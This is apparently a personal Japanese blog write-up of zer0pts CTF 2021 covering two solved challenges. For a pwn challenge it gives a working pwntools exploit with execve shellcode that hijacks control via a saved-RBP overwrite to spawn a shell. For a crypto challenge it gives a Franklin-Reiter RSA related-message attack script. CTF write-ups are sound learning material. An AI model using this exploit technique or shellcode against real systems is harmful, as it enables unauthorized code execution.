+++
title = "zer0pts CTF 2021 writeup"
date = 2021-03-07

[taxonomies]
tags = ["CTF"]
+++

## ポエム

### tl;dr

3/6 09:00 〜 3/7 21:00 に開催された zer0pts CTF 2021 にチーム 0xdef12e (ソロ) で参加しました。
ptr-yudaiさんには SECCON Beginners の Discord で Villager B 関連で相談させて頂いたり、Paken CTF 2020でも色々（）と教えて頂いたりと個人的に一番お世話になっている CTF Player なので結構前から楽しみにしていたイベントです。

問題は宣言されている通り、Guess 要素が本当になかったです。~~テレビの謎解きもこれくらいを目指してくれ~~ 強いて言うなら、Janken VS yoshiking で本当にじゃんけんに 100 回連続で勝てれば...？（つらすぎ）

さて、結果はと言うと Welcome とかを除くと 2 完でした。順位は 131/951 です（得点を得たチームのみ）。かな〜り微妙ですが、CTF 初心者としましては割と頑張った方なんです！！（主張）

{{image(src="../img/zer0pts-ctf-2021/diploma.png")}}


### 雑

問題はもちろん面白かったですが、それ以外で一番面白かったのは Discord での @everyone Injection があった事ですね。#solve-notification で 

> `0xdef12e` solved `Welcome`

みたいな感じで誰がどれを解いたかが通知されるんですが、ID を ``a`@everyone`` にして ``` ` ``` を閉じて @everyone メンションをした人がいました。その人はイエローカードを食らっていましたが、個人的に CTF らしくて面白かったです。

<!-- more -->

## [pwn] Not Beginner's Stack

ご親切にコードと初心者向けの説明書が同封されています。

<details>
<summary>main.S</summary>

```
global _start
section .text

%macro call 1
;; __stack_shadow[__stack_depth++] = return_address;
  mov ecx, [__stack_depth]
  mov qword [__stack_shadow + rcx * 8], %%return_address
  inc dword [__stack_depth]
;; goto function
  jmp %1
  %%return_address:
%endmacro

%macro ret 0
;; goto __stack_shadow[--__stack_depth];
  dec dword [__stack_depth]
  mov ecx, [__stack_depth]
  jmp qword [__stack_shadow + rcx * 8]
%endmacro

_start:
  call notvuln
  call exit

notvuln:
;; char buf[0x100];
  enter 0x100, 0
;; vuln();
  call vuln
;; write(1, "Data: ", 6);
  mov edx, 6
  mov esi, msg_data
  xor edi, edi
  inc edi
  call write
;; read(0, buf, 0x100);
  mov edx, 0x100
  lea rsi, [rbp-0x100]
  xor edi, edi
  call read
;; return 0;
  xor eax, eax
  ret

vuln:
;; char buf[0x100];
  enter 0x100, 0
;; write(1, "Data: ", 6);
  mov edx, 6
  mov esi, msg_data
  xor edi, edi
  inc edi
  call write
;; read(0, buf, 0x1000);
  mov edx, 0x1000               ; [!] vulnerability
  lea rsi, [rbp-0x100]
  xor edi, edi
  call read
;; return;
  leave
  ret

read:
  xor eax, eax
  syscall
  ret

write:
  xor eax, eax
  inc eax
  syscall
  ret

exit:
  mov eax, 60
  syscall
  hlt
  
section .data
msg_data:
  db "Data: "
__stack_depth:
  dd 0

section .bss
__stack_shadow:
  resb 1024
```
</details>

<details>
<summary>Meta data</summary>

```
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped

Arch:     amd64-64-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
```
</details>

<details>
<summary>result of objdump</summary>

```
00000000004000b0 <_start>:
  4000b0:	8b 0c 25 2e 02 60 00 	mov    ecx,DWORD PTR ds:0x60022e
  4000b7:	48 c7 04 cd 34 02 60 	mov    QWORD PTR [rcx*8+0x600234],0x4000cc
  4000be:	00 cc 00 40 00 
  4000c3:	ff 04 25 2e 02 60 00 	inc    DWORD PTR ds:0x60022e
  4000ca:	eb 1f                	jmp    4000eb <notvuln>

00000000004000cc <..@2.return_address>:
  4000cc:	8b 0c 25 2e 02 60 00 	mov    ecx,DWORD PTR ds:0x60022e
  4000d3:	48 c7 04 cd 34 02 60 	mov    QWORD PTR [rcx*8+0x600234],0x4000eb
  4000da:	00 eb 00 40 00 
  4000df:	ff 04 25 2e 02 60 00 	inc    DWORD PTR ds:0x60022e
  4000e6:	e9 33 01 00 00       	jmp    40021e <exit>

00000000004000eb <notvuln>:
  4000eb:	c8 00 01 00          	enter  0x100,0x0
  4000ef:	8b 0c 25 2e 02 60 00 	mov    ecx,DWORD PTR ds:0x60022e
  4000f6:	48 c7 04 cd 34 02 60 	mov    QWORD PTR [rcx*8+0x600234],0x40010b
  4000fd:	00 0b 01 40 00 
  400102:	ff 04 25 2e 02 60 00 	inc    DWORD PTR ds:0x60022e
  400109:	eb 71                	jmp    40017c <vuln>

000000000040010b <..@4.return_address>:
  40010b:	ba 06 00 00 00       	mov    edx,0x6
  400110:	be 28 02 60 00       	mov    esi,0x600228
  400115:	31 ff                	xor    edi,edi
  400117:	ff c7                	inc    edi
  400119:	8b 0c 25 2e 02 60 00 	mov    ecx,DWORD PTR ds:0x60022e
  400120:	48 c7 04 cd 34 02 60 	mov    QWORD PTR [rcx*8+0x600234],0x400138
  400127:	00 38 01 40 00 
  40012c:	ff 04 25 2e 02 60 00 	inc    DWORD PTR ds:0x60022e
  400133:	e9 cb 00 00 00       	jmp    400203 <write>

0000000000400138 <..@5.return_address>:
  400138:	ba 00 01 00 00       	mov    edx,0x100
  40013d:	48 8d b5 00 ff ff ff 	lea    rsi,[rbp-0x100]
  400144:	31 ff                	xor    edi,edi
  400146:	8b 0c 25 2e 02 60 00 	mov    ecx,DWORD PTR ds:0x60022e
  40014d:	48 c7 04 cd 34 02 60 	mov    QWORD PTR [rcx*8+0x600234],0x400165
  400154:	00 65 01 40 00 
  400159:	ff 04 25 2e 02 60 00 	inc    DWORD PTR ds:0x60022e
  400160:	e9 85 00 00 00       	jmp    4001ea <read>

0000000000400165 <..@6.return_address>:
  400165:	31 c0                	xor    eax,eax
  400167:	ff 0c 25 2e 02 60 00 	dec    DWORD PTR ds:0x60022e
  40016e:	8b 0c 25 2e 02 60 00 	mov    ecx,DWORD PTR ds:0x60022e
  400175:	ff 24 cd 34 02 60 00 	jmp    QWORD PTR [rcx*8+0x600234]

000000000040017c <vuln>:
  40017c:	c8 00 01 00          	enter  0x100,0x0
  400180:	ba 06 00 00 00       	mov    edx,0x6
  400185:	be 28 02 60 00       	mov    esi,0x600228
  40018a:	31 ff                	xor    edi,edi
  40018c:	ff c7                	inc    edi
  40018e:	8b 0c 25 2e 02 60 00 	mov    ecx,DWORD PTR ds:0x60022e
  400195:	48 c7 04 cd 34 02 60 	mov    QWORD PTR [rcx*8+0x600234],0x4001aa
  40019c:	00 aa 01 40 00 
  4001a1:	ff 04 25 2e 02 60 00 	inc    DWORD PTR ds:0x60022e
  4001a8:	eb 59                	jmp    400203 <write>

00000000004001aa <..@8.return_address>:
  4001aa:	ba 00 10 00 00       	mov    edx,0x1000
  4001af:	48 8d b5 00 ff ff ff 	lea    rsi,[rbp-0x100]
  4001b6:	31 ff                	xor    edi,edi
  4001b8:	8b 0c 25 2e 02 60 00 	mov    ecx,DWORD PTR ds:0x60022e
  4001bf:	48 c7 04 cd 34 02 60 	mov    QWORD PTR [rcx*8+0x600234],0x4001d4
  4001c6:	00 d4 01 40 00 
  4001cb:	ff 04 25 2e 02 60 00 	inc    DWORD PTR ds:0x60022e
  4001d2:	eb 16                	jmp    4001ea <read>

00000000004001d4 <..@9.return_address>:
  4001d4:	c9                   	leave  
  4001d5:	ff 0c 25 2e 02 60 00 	dec    DWORD PTR ds:0x60022e
  4001dc:	8b 0c 25 2e 02 60 00 	mov    ecx,DWORD PTR ds:0x60022e
  4001e3:	ff 24 cd 34 02 60 00 	jmp    QWORD PTR [rcx*8+0x600234]

00000000004001ea <read>:
  4001ea:	31 c0                	xor    eax,eax
  4001ec:	0f 05                	syscall 
  4001ee:	ff 0c 25 2e 02 60 00 	dec    DWORD PTR ds:0x60022e
  4001f5:	8b 0c 25 2e 02 60 00 	mov    ecx,DWORD PTR ds:0x60022e
  4001fc:	ff 24 cd 34 02 60 00 	jmp    QWORD PTR [rcx*8+0x600234]

0000000000400203 <write>:
  400203:	31 c0                	xor    eax,eax
  400205:	ff c0                	inc    eax
  400207:	0f 05                	syscall 
  400209:	ff 0c 25 2e 02 60 00 	dec    DWORD PTR ds:0x60022e
  400210:	8b 0c 25 2e 02 60 00 	mov    ecx,DWORD PTR ds:0x60022e
  400217:	ff 24 cd 34 02 60 00 	jmp    QWORD PTR [rcx*8+0x600234]

000000000040021e <exit>:
  40021e:	b8 3c 00 00 00       	mov    eax,0x3c
  400223:	0f 05                	syscall 
```
</details>

`vuln` を呼び出して 0x1000 文字読み込んだ後、`notvuln` を呼び出して 0x100 文字読み込むというプログラムです。

0x100 文字のバッファに 0x1000 文字読み込む単純な Buffer Over Flow が起きているのは明らかです。しかし、残念ながら大量に入力しても Segmentation Fault にはなりません。どうやら単純な ROP は出来なさそうです。

と言うのも、objdump の結果を見てみると、`ret` の文字がありません。なんてこった！ 手掛かりを探るため、gdb で動的解析をしてみます。

{{image(src="../img/zer0pts-ctf-2021/gdb.png")}}

早速 `notvuln` の読み込み部分で気になる所が。読み込み先である第二引数のアドレスが、`vuln` で入力した値に含まれるっぽい...? これはつまり、**任意のアドレスに任意の値を代入できる** という事を意味します。

```
  40013d:	48 8d b5 00 ff ff ff 	lea    rsi,[rbp-0x100]
```

もう少し詳しく解析すると、

- `vuln` での入力から `notvuln` の `rbp` までのオフセットは 0x100（正確には、`vuln` の `saved rbp`）
- 第二引数になる `rsi` は `rbp` - 0x100　→　つまり、入力したいアドレス + 0x100 を `rbp` にすれば良い

という事が分かります。では、どこに何を入れれば `rip` を奪取できるかを考えてみましょう。

{{image(src="../img/zer0pts-ctf-2021/gdb2.png")}}

これは、プログラムが `exit` で終了する直前の様子です。0x600234 + `rcx` * 8 、つまり 0x60023C から `rip` を読み込んでジャンプしています。そして、**0x60023c は writable & excutable** です。

```
00400000-00401000 r-xp 00000000 08:07 14683508                           /home/defineprogram/Desktop/CTF/zer0ptsCTF2021/pwn/not beginner/not_beginners_stack/chall
00600000-00601000 rwxp 00000000 08:07 14683508                           /home/defineprogram/Desktop/CTF/zer0ptsCTF2021/pwn/not beginner/not_beginners_stack/chall
7ffff7ffb000-7ffff7ffe000 r--p 00000000 00:00 0                          [vvar]
7ffff7ffe000-7ffff7fff000 r-xp 00000000 00:00 0                          [vdso]
7ffffffde000-7ffffffff000 rwxp 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
```

という事は、スタックの状態を以下のようにするとシェルを取れそうです！

- 0x60023c : 0x60023c + 0x8 = 0x600244 (シェルコードのアドレス)
- 0x600244 : shellcode

このようにすると、`jmp    QWORD PTR [rcx*8+0x600234]` で `rip` に 0x600244 がセットされ、シェルコードが実行されます！

<details>
<summary>Exploit Code</summary>

```py
from pwn import *
elf=ELF("./chall")
p=remote("pwn.ctf.zer0pts.com", 9011)

payload=b"A"*256+p64(0x60023c+0x100)
p.sendlineafter(b"Data: ",payload)
payload=p64(0x600244)+b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
p.sendlineafter(b"Data: ",payload)

p.interactive()
```
</details>

FLAG : `zer0pts{1nt3rm3d14t3_pwn3r5_l1k3_2_0v3rwr1t3_s4v3d_RBP}`

解くのに 1 時間くらい掛かってしまいました。

## [crypto] war(sa)mup

> Do you know RSA? I know.

セグメント木を知っていますか？僕は知っています。（定形文）

さて、重要な部分を抜粋すると以下です。

```py
m = pad(int.from_bytes(flag, "big"), n)
c1 = pow(m, e, n)
c2 = pow(m // 2, e, n)

print("n =", n)
print("e =", e)
print("c1=", c1)
print("c2=", c2)
```

```
n = 113135121314210337963205879392132245927891839184264376753001919135175107917692925687745642532400388405294058068119159052072165971868084999879938794441059047830758789602416617241611903275905693635535414333219575299357763227902178212895661490423647330568988131820052060534245914478223222846644042189866538583089
e = 1337
c1= 89077537464844217317838714274752275745737299140754457809311043026310485657525465380612019060271624958745477080123105341040804682893638929826256518881725504468857309066477953222053834586118046524148078925441309323863670353080908506037906892365564379678072687516738199061826782744188465569562164042809701387515
c2= 18316499600532548540200088385321489533551929653850367414045951501351666430044325649693237350325761799191454032916563398349042002392547617043109953849020374952672554986583214658990393359680155263435896743098100256476711085394564818470798155739552647869415576747325109152123993105242982918456613831667423815762
```

`m//2` が気になりますね。もし $m$ が $2$ で割り切れるなら 

$$
(m/2)^e\ mod\ n \equiv \frac{m^e}{2^e}\ mod\ n
$$

ですから、これに $2^e$ を掛けた値と `c1` は一致するはずです。逆に、割り切れない場合は $2^e$ を掛けた値は 

$$
(m-1)^e\ mod\ n
$$

となるはずです。実際に計算すると、$2^e$ を掛けた値は `c1` と一致しません。つまり、以下の値が判明します。

- $m^e\ mod\ n$
- $(m-1)^e\ mod\ n$

平文が非常に近いですね。こういう時に使える攻撃手法がないかな〜と思って調べると、[Related Message Attack の記事](https://hackmd.io/@Xornet/B16W75IND) がヒットしました。

理解は後日する事にして（最悪）、sage math のスクリプトがあるのでコピペして（最悪 2）ちょっと改変すると、FLAG が表示されました！

```py
from binascii import hexlify, unhexlify
from string import printable


def str_to_num(s):
    return int(hexlify(s), 16)


def num_to_str(s):
    hexed = hex(s)[2:]
    if len(hexed) % 2 == 1:
        hexed = "0" + hexed
    return unhexlify(hexed)


def gcd(a, b):
    while b:
        a, b = b, a % b
    return a.monic()


def franklinreiter(c_1, c_2, e_1, e_2, N, a, b):
    P.<X> = PolynomialRing(Zmod(N))
    g_1 = X^e_1 - c_1
    g_2 = (a*X + b)^e_2 - c_2
    # get constant term
    result = -gcd(g_1, g_2).coefficients()[0]

    return result
 
n = 113135121314210337963205879392132245927891839184264376753001919135175107917692925687745642532400388405294058068119159052072165971868084999879938794441059047830758789602416617241611903275905693635535414333219575299357763227902178212895661490423647330568988131820052060534245914478223222846644042189866538583089
e = 1337
c1= 89077537464844217317838714274752275745737299140754457809311043026310485657525465380612019060271624958745477080123105341040804682893638929826256518881725504468857309066477953222053834586118046524148078925441309323863670353080908506037906892365564379678072687516738199061826782744188465569562164042809701387515
c2= 18316499600532548540200088385321489533551929653850367414045951501351666430044325649693237350325761799191454032916563398349042002392547617043109953849020374952672554986583214658990393359680155263435896743098100256476711085394564818470798155739552647869415576747325109152123993105242982918456613831667423815762
c3=c2*pow(2,e,n)%n

plain=num_to_str(franklinreiter(c1,c3,e,e,n,1,-1))
print(plain)
```

```
b'\x02\x81\xae\xed \xdd\x07\x12;\x99\xc7d:\x99\x1a8\x16\xfe\xe6<\x18\x1dw\xea&\xfb\xfc\x8a\xa7\xa8\xba\xfa\xd8\xbe\xdf\x01\x13\xcb\xd3\x99\x9c\xf3_\x18qw\xb99}\'Q\xd7~\x03&^\xcd\x9aw\xf0\xef\xb5\x04\x1b\xb7\n\xe1\xcd"\x95ff]\x0c(H\x99\xb5\xed\xc3\x82\x9dl\xe4\x8c\xddx\xfd\x00zer0pts{y0u_g07_47_13457_0v3r_1_p0in7}'
```

FLAG : `zer0pts{y0u_g07_47_13457_0v3r_1_p0in7}`

## おしまい

い　か　が　で　し　た　か　？　笑

最近は CTF に傾倒しがちですが、そろそろ競プロも復帰しようと思っています。多分もう 2 ヶ月くらい rated 参加してないので... ← 引退か？

取り敢えず、残り 2 日間の期末を乗り越えるぞ！！（なお、破滅確定）